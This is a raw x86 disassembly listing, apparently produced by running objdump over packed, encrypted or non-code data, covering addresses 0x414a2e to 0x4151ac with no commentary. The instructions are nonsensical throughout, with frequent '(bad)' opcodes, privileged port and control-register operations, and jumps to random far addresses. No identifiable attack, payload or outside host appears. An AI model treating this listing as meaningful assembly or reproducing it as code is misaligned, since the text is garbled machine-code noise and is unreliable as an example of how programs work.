  414a2e:	and    BYTE PTR [eax-0x77],0xb6
  414a32:	(bad)  
  414a34:	in     eax,dx
  414a35:	jnp    0x4149f1
  414a37:	lds    edx,FWORD PTR ds:0x7dc22d6b
  414a3d:	bound  edx,QWORD PTR [eax-0x2d]
  414a40:	pop    edi
  414a41:	mov    bh,0x1a
  414a43:	dec    edx
  414a44:	test   BYTE PTR [ecx+0x1a],cl
  414a47:	inc    esp
  414a48:	jo     0x414a6f
  414a4a:	jae    0x414a62
  414a4c:	jns    0x414a8b
  414a4e:	sub    dl,ch
  414a50:	mov    edi,0xbd68e98a
  414a55:	jb     0x414a4b
  414a57:	mov    ch,dh
  414a59:	dec    ebx
  414a5a:	lock sti 
  414a5c:	shl    DWORD PTR [esi-0x24d38f92],cl
  414a62:	sub    esi,edx
  414a64:	mov    ds:0x3d6458f0,al
  414a69:	push   eax
  414a6a:	sti    
  414a6b:	or     BYTE PTR [esp+edi*4-0x35],dh
  414a6f:	add    eax,DWORD PTR [edx]
  414a71:	hlt    
  414a72:	cmp    DWORD PTR [eax-0x1],ebx
  414a75:	xlat   BYTE PTR ds:[ebx]
  414a76:	jge    0x414ad0
  414a78:	dec    edi
  414a79:	push   0x6a
  414a7b:	cmp    al,0x48
  414a7d:	test   DWORD PTR [ecx-0x403028],0xeda40bdd
  414a87:	lds    ecx,FWORD PTR [ebx-0x10bc393a]
  414a8d:	icebp  
  414a8e:	sub    al,0x96
  414a90:	or     esi,DWORD PTR [ebx]
  414a92:	fxrstor [edx]
  414a95:	push   0xae62b1b
  414a9a:	clc    
  414a9b:	es (bad) 
  414a9d:	sub    BYTE PTR [edx+ebx*2],0x7d
  414aa1:	aas    
  414aa2:	pop    ebp
  414aa3:	pop    fs
  414aa5:	div    DWORD PTR [edx+0x48203522]
  414aab:	pop    esp
  414aac:	ficom  WORD PTR [ecx-0x695cb068]
  414ab2:	push   ebx
  414ab3:	mov    BYTE PTR [esi+0x5f],cl
  414ab6:	sbb    DWORD PTR [esi],edx
  414ab8:	aas    
  414ab9:	sbb    al,0xca
  414abb:	popa   
  414abc:	(bad)  
  414abe:	in     eax,dx
  414abf:	and    BYTE PTR [ecx],cl
  414ac1:	sbb    ecx,ecx
  414ac3:	add    al,0x34
  414ac5:	and    ah,ah
  414ac7:	xor    BYTE PTR [ecx],ch
  414ac9:	(bad)  
  414aca:	mov    eax,ds:0x19fba391
  414acf:	in     eax,dx
  414ad0:	rcl    ecx,1
  414ad2:	iret   
  414ad3:	fs ins BYTE PTR es:[edi],dx
  414ad5:	int3   
  414ad6:	fidiv  DWORD PTR [ebp-0x4d]
  414ad9:	fidivr DWORD PTR ss:[ebx-0x223f24e0]
  414ae0:	xor    al,0x28
  414ae2:	cmp    BYTE PTR [eax+0x326ed006],al
  414ae8:	shr    al,1
  414aea:	data16 fmul DWORD PTR fs:[ebp+eax*1-0x2f2d2f0e]
  414af3:	or     eax,0x7a7e9625
  414af8:	mov    ah,0xd0
  414afa:	repz sar DWORD PTR [eax-0x56],1
  414afe:	xor    eax,0xac15e736
  414b03:	int3   
  414b04:	bound  esp,QWORD PTR [eax]
  414b06:	inc    ecx
  414b07:	and    ecx,ebp
  414b09:	arpl   di,bp
  414b0b:	daa    
  414b0c:	xchg   esi,eax
  414b0d:	mov    edx,0x96879db
  414b12:	mov    ds:0xee4e3418,eax
  414b17:	push   ebx
  414b18:	shl    BYTE PTR [esi],1
  414b1a:	ret    
  414b1b:	rcl    DWORD PTR [eax],0x87
  414b1e:	test   al,0xa4
  414b20:	lds    edx,FWORD PTR [edi+0x74]
  414b23:	fs jo  0x414b40
  414b26:	test   al,0xfb
  414b28:	daa    
  414b29:	xor    dl,BYTE PTR [ebx]
  414b2b:	in     eax,0x4c
  414b2d:	pop    eax
  414b2e:	popf   
  414b2f:	sub    al,0xe2
  414b31:	sbb    cl,dl
  414b33:	popa   
  414b34:	popf   
  414b35:	out    dx,eax
  414b36:	push   cs
  414b37:	imul   ecx,DWORD PTR [edi+ecx*1],0x85c16244
  414b3e:	not    BYTE PTR [edi]
  414b40:	stos   BYTE PTR es:[edi],al
  414b41:	dec    edx
  414b42:	aam    0x41
  414b44:	ret    
  414b45:	mov    ebx,0x9ba08ba0
  414b4a:	inc    ebx
  414b4b:	adc    esi,edi
  414b4d:	ret    
  414b4e:	lea    esi,[ecx-0x24436666]
  414b54:	add    eax,0x1888c5e1
  414b59:	mov    esi,0x1eacd4e3
  414b5e:	pop    edi
  414b5f:	pop    ds
  414b60:	rcr    DWORD PTR [ebx+edx*4+0x6a],cl
  414b64:	xlat   BYTE PTR ds:[ebx]
  414b65:	jl     0x414b47
  414b67:	shr    edx,0x71
  414b6a:	dec    edi
  414b6b:	mov    esi,0x439eb727
  414b70:	sar    ebx,cl
  414b72:	outs   dx,BYTE PTR ds:[esi]
  414b73:	fxch   st(0)
  414b75:	(bad)  
  414b76:	(bad)  
  414b77:	paddusb mm1,QWORD PTR [ebp+0x34]
  414b7b:	(bad)  
  414b7c:	and    bh,BYTE PTR [ecx+0x63]
  414b7f:	in     eax,dx
  414b80:	cmp    DWORD PTR [ebp+0x5a],edi
  414b83:	fld    QWORD PTR [ebp+0x59]
  414b86:	xchg   ecx,eax
  414b87:	call   0x40506310
  414b8c:	fs in  al,0xc8
  414b8f:	jo     0x414b2b
  414b91:	fnstenv [edi]
  414b93:	loop   0x414b6e
  414b95:	cld    
  414b96:	pushf  
  414b97:	push   eax
  414b98:	adc    ah,ah
  414b9a:	mov    al,ds:0xa378e493
  414b9f:	test   BYTE PTR [eax+0x2f],ah
  414ba2:	sub    DWORD PTR [esi],0x7f
  414ba5:	or     DWORD PTR [esi],ecx
  414ba7:	lods   al,BYTE PTR ds:[esi]
  414ba8:	ss mov bl,0xa
  414bab:	icebp  
  414bac:	mov    cl,0x5
  414bae:	xor    ecx,DWORD PTR [edi+0x117afe1c]
  414bb4:	shl    DWORD PTR [esp+ebp*4+0x3f],cl
  414bb8:	lock push edi
  414bba:	pop    edi
  414bbb:	outs   dx,DWORD PTR ds:[esi]
  414bbc:	pop    ebx
  414bbd:	loopne 0x414bdb
  414bbf:	jecxz  0x414b83
  414bc1:	xor    eax,0x9f810d07
  414bc6:	popf   
  414bc7:	rcr    DWORD PTR [ebp-0x274d91fa],cl
  414bcd:	dec    ecx
  414bce:	push   esp
  414bcf:	(bad)  
  414bd0:	push   ecx
  414bd1:	pushf  
  414bd2:	adc    BYTE PTR [edx+0x5e],bl
  414bd5:	lds    edx,FWORD PTR [edi+0x595161e0]
  414bdb:	push   0xffffffec
  414bdd:	jl     0x414b6e
  414bdf:	jo     0x414b98
  414be1:	mov    ecx,cr5
  414be4:	sub    ecx,ebp
  414be6:	cmp    al,0x94
  414be8:	in     eax,0x9e
  414bea:	loopne 0x414c67
  414bec:	pop    ss
  414bed:	push   esp
  414bee:	cmp    al,0xa9
  414bf0:	sub    al,BYTE PTR [edx]
  414bf2:	add    DWORD PTR [edx-0x5b],0xdb961aca
  414bf9:	dec    esi
  414bfa:	or     DWORD PTR [edx],edx
  414bfc:	mov    al,ds:0xf9f14ffb
  414c01:	jnp    0x414bb8
  414c03:	jle    0x414be6
  414c05:	dec    edi
  414c06:	jge    0x414c10
  414c08:	scas   eax,DWORD PTR es:[edi]
  414c09:	loop   0x414bce
  414c0b:	fmul   st,st(6)
  414c0d:	mov    edi,eax
  414c0f:	sti    
  414c10:	adc    DWORD PTR [edx+0x56],0x2cca5d89
  414c17:	xlat   BYTE PTR ds:[ebx]
  414c18:	bswap  edx
  414c1a:	test   eax,0xbcaf8a73
  414c1f:	pop    esi
  414c20:	dec    esp
  414c21:	loopne 0x414bbd
  414c23:	sahf   
  414c24:	lock dec esp
  414c26:	adc    esi,DWORD PTR [ecx+eax*8]
  414c29:	leave  
  414c2a:	inc    edx
  414c2b:	sub    edx,ebx
  414c2d:	imul   ebx,DWORD PTR [esi-0x53394dd4],0xffffffba
  414c34:	(bad)
  414c38:	lods   eax,DWORD PTR ds:[esi]
  414c39:	cmp    BYTE PTR ds:0x30fadb93,0x28
  414c40:	or     bh,BYTE PTR [eax+0x64e8b3d3]
  414c46:	bound  ebx,QWORD PTR ds:0xcd2ac1e9
  414c4c:	test   ecx,ecx
  414c4e:	ds daa 
  414c50:	mov    ds:0x51679cc9,al
  414c55:	sub    ebx,DWORD PTR [eax]
  414c57:	adc    DWORD PTR [eax-0x539a6ce0],0x5defca0f
  414c61:	fwait
  414c62:	jge    0x414c02
  414c64:	jp     0x414cab
  414c66:	push   edx
  414c67:	and    edi,ebp
  414c69:	dec    ebp
  414c6a:	mov    dl,0x36
  414c6c:	outs   dx,DWORD PTR ds:[esi]
  414c6d:	and    dh,al
  414c6f:	add    edi,DWORD PTR [ebp+eax*2+0x3643a17a]
  414c76:	mov    DWORD PTR [edi-0x3b],ebx
  414c79:	xchg   esi,eax
  414c7a:	xchg   ebp,eax
  414c7b:	jns    0x414c3e
  414c7d:	(bad)  
  414c7e:	ret    0xefc0
  414c81:	scas   eax,DWORD PTR es:[edi]
  414c82:	out    0xd5,al
  414c84:	xor    edi,ebp
  414c86:	inc    esi
  414c87:	jb     0x414c67
  414c89:	push   cs
  414c8a:	aam    0x98
  414c8c:	push   0x18
  414c8e:	loopne 0x414c90
  414c90:	jmp    0x6003f945
  414c95:	aam    0x4e
  414c97:	mov    ebx,DWORD PTR [edx-0x3e2c87]
  414c9d:	mov    cl,0x7
  414c9f:	int3   
  414ca0:	or     eax,0x165adb7c
  414ca5:	and    al,cl
  414ca7:	add    eax,0x599652d7
  414cac:	ret    
  414cad:	popf   
  414cae:	push   es
  414caf:	rcl    BYTE PTR [ecx],cl
  414cb1:	push   ebx
  414cb2:	into   
  414cb3:	addr16 out 0x0,al
  414cb6:	cmp    bl,dh
  414cb8:	iret   
  414cb9:	add    al,0xb4
  414cbb:	mov    esp,0xc2462674
  414cc0:	add    DWORD PTR [edx+0x62],eax
  414cc3:	retf   0xe26f
  414cc6:	inc    esp
  414cc7:	clc    
  414cc8:	push   0xe1b3ffaa
  414ccd:	fs leave 
  414ccf:	enter  0x90e3,0xfb
  414cd3:	jbe    0x414d04
  414cd5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414cd6:	(bad)  
  414cd7:	cmp    al,0x46
  414cd9:	int    0xe7
  414cdb:	les    ebx,FWORD PTR [edx+0x9]
  414cde:	aad    0x9a
  414ce0:	rcl    DWORD PTR [esi],0x9a
  414ce3:	sti    
  414ce4:	pop    eax
  414ce5:	outs   dx,BYTE PTR ds:[esi]
  414ce6:	shr    BYTE PTR [edx-0x26],cl
  414ce9:	nop
  414cea:	add    ah,BYTE PTR [eax+esi*1-0x558e43fb]
  414cf1:	jae    0x414cca
  414cf3:	cs mov eax,0x2519720a
  414cf9:	and    BYTE PTR [ecx+0x61789256],0xf4
  414d00:	aad    0x44
  414d02:	mov    cl,0x3b
  414d04:	inc    DWORD PTR [esi+0x5a]
  414d07:	sub    ah,BYTE PTR [esi+ebx*1]
  414d0a:	repnz cmc 
  414d0c:	imul   DWORD PTR [ebp+0x326e2cf]
  414d12:	dec    ecx
  414d13:	inc    esi
  414d14:	sbb    esp,DWORD PTR [esi+0x7d445896]
  414d1a:	cmp    dh,BYTE PTR [ecx+0x17b94569]
  414d20:	jo     0x414cfa
  414d22:	and    esp,ebp
  414d24:	stos   DWORD PTR es:[edi],eax
  414d25:	mov    bl,0x15
  414d27:	fiadd  DWORD PTR [edi+0x3138d82e]
  414d2d:	ss std 
  414d2f:	js     0x414d66
  414d31:	dec    ebx
  414d32:	sbb    esi,DWORD PTR [ecx-0x2b]
  414d35:	lods   al,BYTE PTR ds:[esi]
  414d36:	dec    eax
  414d37:	sbb    ch,BYTE PTR [edx-0x40]
  414d3a:	mov    BYTE PTR [eax],ch
  414d3c:	gs cmp al,0xb5
  414d3f:	iret   
  414d40:	push   edi
  414d41:	hlt    
  414d42:	frstor [esi-0x1c]
  414d45:	or     eax,0xe8cd07d5
  414d4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414d4b:	add    edx,DWORD PTR [eax+0x1b130816]
  414d51:	and    BYTE PTR [edx-0x2a],bh
  414d54:	adc    dh,BYTE PTR [ebx+0xf]
  414d57:	sub    al,0x83
  414d59:	addr16 sti 
  414d5b:	mov    ds:0x52182a55,eax
  414d60:	pop    ebp
  414d61:	pop    ebp
  414d62:	or     ah,bl
  414d64:	inc    esp
  414d65:	and    DWORD PTR ds:0x8adde1b8,esp
  414d6b:	and    al,0x8a
  414d6d:	std    
  414d6e:	stos   WORD PTR es:[edi],ax
  414d70:	nop
  414d71:	addr16 in eax,dx
  414d73:	xor    BYTE PTR [ebx-0x72370321],0x91
  414d7a:	dec    esp
  414d7b:	mov    ebp,es
  414d7d:	jmp    0xf058:0x80c6ed26
  414d84:	das    
  414d85:	aas    
  414d86:	sbb    ch,BYTE PTR [edx+ebp*1+0x27]
  414d8a:	lea    esi,[edi]
  414d8c:	cmp    BYTE PTR [ebx-0x1f],0x67
  414d90:	test   eax,0x80a72839
  414d95:	aam    0xbb
  414d97:	mov    ebx,0xa91b7cfb
  414d9c:	mov    al,0x6a
  414d9e:	jb     0x414d75
  414da0:	jg     0x414d80
  414da2:	adc    al,0xfb
  414da4:	jle    0x414d7e
  414da6:	fimul  WORD PTR [edx]
  414da8:	or     esp,DWORD PTR [edi+0x1857aee3]
  414dae:	lea    edx,[edi+0x3cd2ec6]
  414db4:	sub    dh,BYTE PTR [esi+edx*1-0x74]
  414db8:	dec    ebp
  414db9:	jns    0x414d3d
  414dbb:	jns    0x414e3c
  414dbd:	fiadd  DWORD PTR [ebx]
  414dbf:	dec    edi
  414dc0:	dec    edi
  414dc1:	mov    dl,0x1b
  414dc3:	sbb    dl,0xad
  414dc6:	cli    
  414dc7:	mov    DWORD PTR [esi],ebx
  414dc9:	(bad)  
  414dcb:	add    ch,BYTE PTR [ecx]
  414dcd:	aaa    
  414dce:	dec    edx
  414dcf:	(bad)  
  414dd0:	fmul   QWORD PTR [eax-0x402a849d]
  414dd6:	mov    al,ds:0x3d768df4
  414ddb:	xor    BYTE PTR [edi+ebx*4],dh
  414dde:	in     eax,dx
  414ddf:	xchg   BYTE PTR [edx],dh
  414de1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414de2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414de3:	enter  0x8612,0x88
  414de7:	test   BYTE PTR [ecx],dl
  414de9:	xchg   ebx,eax
  414dea:	push   edi
  414deb:	int    0xd8
  414ded:	(bad)  
  414dee:	outs   dx,DWORD PTR ds:[esi]
  414def:	mov    cl,bl
  414df1:	cmp    bh,BYTE PTR [eax+0x69d0624]
  414df7:	dec    ebx
  414df8:	xor    al,0x52
  414dfa:	loopne 0x414df3
  414dfc:	inc    edi
  414dfd:	push   ds
  414dfe:	xor    edi,DWORD PTR [eax]
  414e00:	lahf   
  414e01:	fcmovbe st,st(1)
  414e03:	xchg   edi,eax
  414e04:	jbe    0x414ddb
  414e06:	add    DWORD PTR [edx+0x64],esi
  414e09:	into   
  414e0a:	repz add eax,0xa2a9901f
  414e10:	xor    al,0xe3
  414e12:	retf   
  414e13:	(bad)  
  414e14:	repz pop es
  414e16:	xor    eax,edi
  414e18:	sbb    cl,al
  414e1a:	xchg   BYTE PTR [edx+0x1a9c26e9],dl
  414e20:	inc    esp
  414e21:	adc    BYTE PTR [ebx-0x52],dl
  414e24:	pop    edx
  414e25:	mov    ebx,0x60484164
  414e2a:	fstp   TBYTE PTR [esi+0x1d034a50]
  414e30:	jbe    0x414dc5
  414e32:	mov    dh,dh
  414e34:	push   cs
  414e35:	or     al,0xdf
  414e37:	jle    0x414e12
  414e39:	xchg   DWORD PTR [ebp+0x694b6860],esi
  414e3f:	inc    esi
  414e40:	xor    BYTE PTR [ecx-0x72],cl
  414e43:	stos   DWORD PTR es:[edi],eax
  414e44:	ins    BYTE PTR es:[edi],dx
  414e45:	popa   
  414e46:	mov    esp,DWORD PTR [eax+0x77cfbcc2]
  414e4c:	inc    ecx
  414e4d:	mov    edi,0x4655ad
  414e52:	or     BYTE PTR [ebx+ebp*4-0x76],0x3
  414e57:	fptan  
  414e59:	xor    dh,dh
  414e5b:	adc    DWORD PTR [esi+0x574b860b],ecx
  414e61:	dec    ecx
  414e62:	pop    eax
  414e63:	mov    ah,0x6d
  414e65:	jne    0x414e54
  414e67:	xchg   DWORD PTR [ebx+0x1b],eax
  414e6a:	or     DWORD PTR [eax+0x5],0x5bdfb590
  414e71:	adc    al,0xcf
  414e73:	pop    esp
  414e74:	stos   DWORD PTR es:[edi],eax
  414e75:	loop   0x414ec2
  414e77:	aaa    
  414e78:	stos   DWORD PTR es:[edi],eax
  414e79:	sbb    DWORD PTR [esi],esp
  414e7b:	out    dx,eax
  414e7c:	std    
  414e7d:	fmul   QWORD PTR [eax]
  414e7f:	mov    BYTE PTR [ecx+0x3b],al
  414e82:	dec    ebx
  414e83:	or     dh,BYTE PTR [ebp-0x18779974]
  414e89:	out    dx,al
  414e8a:	xchg   ecx,eax
  414e8b:	jo     0x414ea8
  414e8d:	adc    BYTE PTR [ebx-0x55],dl
  414e90:	xor    eax,DWORD PTR [edx-0x31]
  414e93:	in     al,dx
  414e94:	aaa    
  414e95:	retf   
  414e96:	dec    eax
  414e97:	loop   0x414e92
  414e99:	mov    BYTE PTR [esi],ah
  414e9b:	xor    bh,BYTE PTR ds:0x2298560b
  414ea1:	cmp    al,0xeb
  414ea3:	cmp    al,0xd9
  414ea5:	push   eax
  414ea6:	stc    
  414ea7:	add    eax,0xd7ded8a6
  414eac:	xchg   DWORD PTR [ebx],edx
  414eae:	cs jge 0x414eb2
  414eb1:	inc    edi
  414eb2:	rcr    esp,1
  414eb4:	push   ds
  414eb5:	or     al,0x29
  414eb7:	sbb    esi,DWORD PTR [esi+0x61fdc69]
  414ebd:	cwde   
  414ebe:	or     eax,0xc2df635f
  414ec3:	jecxz  0x414e60
  414ec5:	retf   0xf31d
  414ec8:	pop    ebp
  414ec9:	mov    cl,0xa7
  414ecb:	gs (bad) 
  414ecd:	imul   eax,DWORD PTR [eax-0x6800bb45],0x81e38e95
  414ed7:	push   esp
  414ed8:	mov    bl,0x23
  414eda:	in     al,dx
  414edb:	pop    es
  414edc:	loope  0x414e8c
  414ede:	mov    ds:0xa090981c,eax
  414ee3:	shl    BYTE PTR ds:0x66a71892,1
  414ee9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414eea:	ret    0xf896
  414eed:	jmp    DWORD PTR [eax-0x1e74b4d3]
  414ef3:	dec    esi
  414ef4:	dec    esp
  414ef5:	or     ecx,0xc5028598
  414efb:	leave  
  414efc:	jns    0x414eb5
  414efe:	imul   esp,DWORD PTR [edi+0x1699f4a6],0x8935a9f6
  414f08:	cmp    al,0x27
  414f0a:	out    dx,al
  414f0b:	jmp    0xb4ac:0xd691b69c
  414f12:	jb     0x414f6c
  414f14:	mov    al,BYTE PTR [esi]
  414f16:	push   edi
  414f17:	ins    BYTE PTR es:[edi],dx
  414f18:	xor    BYTE PTR [ecx],dh
  414f1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414f1b:	bswap  esi
  414f1d:	inc    ecx
  414f1e:	xor    BYTE PTR [esi],bl
  414f20:	loope  0x414efb
  414f22:	sub    al,al
  414f24:	pushf  
  414f25:	mov    edi,0x9849a9f3
  414f2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414f2b:	jp     0x414f71
  414f2d:	pop    es
  414f2e:	(bad)  
  414f30:	sbb    al,0xa5
  414f32:	jecxz  0x414ef9
  414f34:	out    dx,al
  414f35:	into   
  414f36:	pop    eax
  414f37:	or     esi,0xddc41f6d
  414f3d:	jne    0x414eea
  414f3f:	(bad)  
  414f40:	std    
  414f41:	pop    ds
  414f42:	fld    st(3)
  414f44:	pop    ecx
  414f45:	cmp    DWORD PTR [esi-0x7e],ecx
  414f48:	jg     0x414f5a
  414f4a:	cld    
  414f4b:	sub    BYTE PTR [ebx],0x8f
  414f4e:	jge    0x414fb4
  414f50:	xlat   BYTE PTR ds:[ebx]
  414f51:	xor    BYTE PTR [ebp-0x13],0xc2
  414f55:	ins    DWORD PTR es:[edi],dx
  414f56:	pop    ds
  414f57:	fcmovbe st,st(3)
  414f59:	xchg   ecx,eax
  414f5a:	leave  
  414f5b:	(bad)  
  414f5c:	mov    ds:0xc9300ee4,eax
  414f61:	jmp    edi
  414f63:	and    cl,BYTE PTR [esi]
  414f65:	out    dx,eax
  414f66:	xor    BYTE PTR [esi+0x4],al
  414f69:	(bad)  
  414f6a:	sub    eax,0xe0c4b6ec
  414f6f:	test   al,0x4a
  414f71:	adc    ch,BYTE PTR [ebx]
  414f73:	out    0xcc,al
  414f75:	jle    0x414fb9
  414f77:	sahf   
  414f78:	shr    BYTE PTR [eax+0x57],cl
  414f7b:	mov    al,BYTE PTR [edx]
  414f7d:	inc    ebx
  414f7e:	jg     0x414f26
  414f80:	pop    ss
  414f81:	dec    eax
  414f82:	rcr    DWORD PTR [ebx-0x4e],cl
  414f85:	mov    dh,0x22
  414f87:	add    eax,0x2068efcc
  414f8c:	scas   al,BYTE PTR es:[edi]
  414f8d:	adc    DWORD PTR [esi+0x16],ebp
  414f90:	mov    edi,ebp
  414f92:	call   0x5df7:0xe00d0132
  414f99:	in     eax,dx
  414f9a:	inc    edx
  414f9b:	cmp    DWORD PTR [esi],ebx
  414f9d:	(bad)  
  414f9e:	xor    bh,ah
  414fa0:	jecxz  0x414f59
  414fa2:	les    ebp,FWORD PTR [ebp+0x17]
  414fa5:	pop    ecx
  414fa6:	mov    edi,0x5c33727f
  414fab:	int3   
  414fac:	push   edx
  414fad:	aas    
  414fae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414faf:	mov    bl,0x13
  414fb1:	dec    ebx
  414fb2:	stos   BYTE PTR es:[edi],al
  414fb3:	sar    BYTE PTR [edx+0x29],1
  414fb6:	loope  0x41501d
  414fb8:	or     al,0xd4
  414fba:	push   edi
  414fbb:	retf   
  414fbc:	or     DWORD PTR [ebx-0x56b39d43],0x99a26d40
  414fc6:	idiv   DWORD PTR [edi]
  414fc8:	mov    edi,0xa1728259
  414fcd:	pminsw mm2,QWORD PTR [esi]
  414fd0:	mov    bh,0xd3
  414fd2:	jb     0x414f63
  414fd4:	cmp    al,0xd3
  414fd6:	cmp    DWORD PTR [ebp-0x39],ebx
  414fd9:	ret    0x74b1
  414fdc:	mov    BYTE PTR [edx],al
  414fde:	addr16 dec edx
  414fe0:	fsubr  DWORD PTR [esi+0x6f]
  414fe3:	sbb    BYTE PTR [esi-0x4a],0x73
  414fe7:	ins    DWORD PTR es:[edi],dx
  414fe8:	lea    esi,[edx+ebx*8-0x6bf6a9a2]
  414fef:	push   ds
  414ff0:	stos   BYTE PTR es:[edi],al
  414ff1:	inc    edx
  414ff2:	fdiv   QWORD PTR ss:[ebp+0x58]
  414ff6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414ff7:	pushf  
  414ff8:	dec    edx
  414ff9:	call   DWORD PTR [ebx+0x2b]
  414ffc:	xchg   edi,eax
  414ffd:	jl     0x414faf
  414fff:	cmp    eax,0x4cdb50ee
  415004:	add    DWORD PTR [ecx],ebx
  415006:	clc    
  415007:	jb     0x41503c
  415009:	das    
  41500a:	xchg   esi,eax
  41500b:	aaa    
  41500c:	int3   
  41500d:	xchg   ebx,eax
  41500e:	mov    ecx,0xb0d45787
  415013:	sysexit 
  415015:	xchg   ebx,eax
  415016:	xor    cl,bl
  415018:	adc    BYTE PTR [esi+0x4aca8e76],bh
  41501e:	jno    0x415077
  415020:	pushf  
  415021:	call   0x3fb6f9ec
  415026:	pop    ds
  415027:	addr16 dec ecx
  415029:	pop    esp
  41502a:	push   ecx
  41502b:	test   al,0x4f
  41502d:	cmp    eax,0xc6c222
  415032:	int    0x2b
  415034:	je     0x41507f
  415036:	test   al,0x3a
  415038:	leave  
  415039:	xor    esp,ebx
  41503b:	sbb    al,0x1c
  41503d:	cmp    BYTE PTR [ecx+edx*1-0x54],cl
  415041:	mov    dl,0x6b
  415043:	test   DWORD PTR [esi],eax
  415045:	sahf   
  415046:	jmp    0x9a6a1307
  41504b:	retf   
  41504c:	jmp    0xdd29:0x590c8dd7
  415053:	(bad)  
  415054:	and    ebp,eax
  415056:	mov    ds:0xab656b82,eax
  41505b:	push   edx
  41505c:	fiadd  DWORD PTR [ebp+0x39]
  41505f:	cdq    
  415060:	inc    edx
  415061:	in     eax,0xdd
  415063:	ror    DWORD PTR [ebx-0x3af5122a],0xa9
  41506a:	test   ebx,esp
  41506c:	adc    ch,0xd6
  41506f:	sbb    DWORD PTR [esi+ebx*8-0x78],0xffffff8e
  415074:	pop    edi
  415075:	(bad)  
  415076:	loope  0x4150c2
  415078:	dec    esp
  415079:	push   cs
  41507a:	je     0x415035
  41507c:	int    0xa9
  41507e:	test   BYTE PTR [ecx-0x59],bh
  415081:	scas   eax,DWORD PTR es:[edi]
  415082:	cmp    BYTE PTR [ebp+eiz*8-0x1a2b6d7e],dl
  415089:	(bad)  
  41508a:	jnp    0x415081
  41508c:	in     eax,0x4b
  41508e:	adc    BYTE PTR [ebx-0x25],dh
  415091:	jecxz  0x41503f
  415093:	sub    BYTE PTR [edi-0x6912317d],bh
  415099:	mov    ebp,0x636b2932
  41509e:	jmp    0x61ad47bc
  4150a3:	pop    eax
  4150a4:	dec    ebp
  4150a5:	enter  0x3d6f,0x52
  4150a9:	ja     0x4150f3
  4150ab:	es in  eax,0xb3
  4150ae:	ja     0x415121
  4150b0:	aaa    
  4150b1:	sbb    BYTE PTR [ecx+0x167cfc5a],cl
  4150b7:	pop    edi
  4150b8:	cli    
  4150b9:	ret    
  4150ba:	mov    WORD PTR [eax-0x12bc4d45],cs
  4150c0:	test   edi,ebx
  4150c2:	repz xchg ebp,eax
  4150c4:	jbe    0x41508c
  4150c6:	sub    BYTE PTR [ebp-0x6c],ah
  4150c9:	loope  0x415070
  4150cb:	retf   
  4150cc:	lods   al,BYTE PTR ds:[esi]
  4150cd:	jne    0x415074
  4150cf:	loopne 0x41513a
  4150d1:	inc    edi
  4150d2:	in     al,dx
  4150d3:	fistp  QWORD PTR [ebx+0x4d]
  4150d6:	imul   ebp,ecx,0x3f5214e8
  4150dc:	push   ss
  4150dd:	mov    edi,0x73257354
  4150e2:	or     esi,DWORD PTR [ebp+0x28a7802e]
  4150e8:	shl    DWORD PTR [esp+edx*4+0x49],cl
  4150ec:	pop    edi
  4150ed:	jmp    0x415103
  4150ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4150f0:	mov    ds:0x42e8074f,eax
  4150f5:	dec    ebp
  4150f6:	dec    ecx
  4150f7:	xchg   edi,eax
  4150f8:	mov    dh,0xe0
  4150fa:	xchg   ebx,eax
  4150fb:	aad    0x45
  4150fd:	xor    al,BYTE PTR [eax+0x650139f5]
  415103:	xchg   ebx,eax
  415104:	sub    DWORD PTR [esi],ebp
  415106:	fsub   DWORD PTR [edi+esi*8+0x734ca821]
  41510d:	or     DWORD PTR [edi+0x13],esp
  415110:	aas    
  415111:	lods   al,BYTE PTR ds:[esi]
  415112:	test   BYTE PTR [ebx-0x62],dl
  415115:	scas   eax,DWORD PTR es:[edi]
  415116:	xor    al,0xac
  415118:	xlat   BYTE PTR ds:[ebx]
  415119:	and    ah,BYTE PTR [edi]
  41511b:	push   0x1d
  41511d:	cmp    bh,BYTE PTR [edx+ecx*4+0x1ba0061b]
  415124:	xchg   esi,eax
  415125:	sbb    al,0x6e
  415127:	sub    BYTE PTR [eax],bl
  415129:	mov    ch,0xcc
  41512b:	leave  
  41512c:	mov    BYTE PTR [eax],ch
  41512e:	push   ebx
  41512f:	ret    
  415130:	imul   eax,DWORD PTR [ecx],0x99f98739
  415136:	in     eax,0x3f
  415138:	mov    ds,esi
  41513a:	out    0xab,eax
  41513c:	pop    esp
  41513d:	rcl    DWORD PTR [eax+0x7770323c],0x16
  415144:	mov    ch,0x18
  415146:	and    ebx,DWORD PTR [ecx]
  415148:	sbb    DWORD PTR [ebx],edi
  41514a:	mov    esi,0x7c4bef7e
  41514f:	mov    esp,0x6d8be928
  415154:	xor    dl,BYTE PTR [esi-0x5a]
  415157:	adc    al,0xf2
  415159:	outs   dx,BYTE PTR ds:[esi]
  41515a:	inc    esp
  41515b:	cmp    edx,ebx
  41515d:	push   ds
  41515e:	xor    bl,bh
  415160:	xlat   BYTE PTR ds:[ebx]
  415161:	(bad)  
  415162:	jg     0x41518d
  415164:	push   ecx
  415165:	sti    
  415166:	sub    al,0x82
  415168:	add    DWORD PTR ds:0x78fcb04a,esp
  41516e:	fnstenv [ecx+0xdf367c4]
  415174:	out    dx,eax
  415175:	xor    bh,BYTE PTR [ebx-0x2a]
  415178:	ret    0x55e8
  41517b:	sub    BYTE PTR [eax+0x1e],al
  41517e:	xor    al,0x4f
  415180:	bound  ecx,QWORD PTR [eax+ebp*2+0x14]
  415184:	and    BYTE PTR [esi],cl
  415186:	jmp    0x9daaa1e7
  41518b:	mov    ah,0xbd
  41518d:	stc    
  41518e:	into   
  41518f:	cwde   
  415190:	retf   
  415191:	push   eax
  415192:	out    dx,al
  415193:	adc    edi,eax
  415195:	lods   al,BYTE PTR ds:[esi]
  415196:	loop   0x415130
  415198:	cwde   
  415199:	mov    cl,0x2
  41519b:	loopne 0x41516a
  41519d:	dec    ecx
  41519e:	stc    
  41519f:	mov    edi,0xcbbc3573
  4151a4:	sbb    eax,0x9315c7ed
  4151a9:	add    al,0x72
  4151ab:	push   cs
  4151ac:	fbstp  TBYTE PTR [edx-0x26f22d7d]
